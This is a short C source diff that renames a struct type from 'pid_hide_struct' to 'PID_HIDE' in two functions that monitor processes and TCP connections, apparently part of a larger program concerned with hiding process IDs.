@@ -399,7 +399,7 @@ DWORD MonitorProcesses(DWORD dummy)
 	DWORD index;
 	BOOL process_found;
 	enum_win_par_struct enum_win_par;
-	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
+	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 
 	LOOP {
 		CANCELLATION_POINT(em_mp_cp);
@@ -652,7 +652,7 @@ BOOL IPAddrIsLocal(DWORD ip_addr)
 DWORD MonitorConnection(DWORD dummy)
 {
 	PMIB_TCPTABLE_OWNER_PID pTcpTable;
-	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
+	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 	DWORD i, j, dwSize;
 	BOOL conn_found;
 
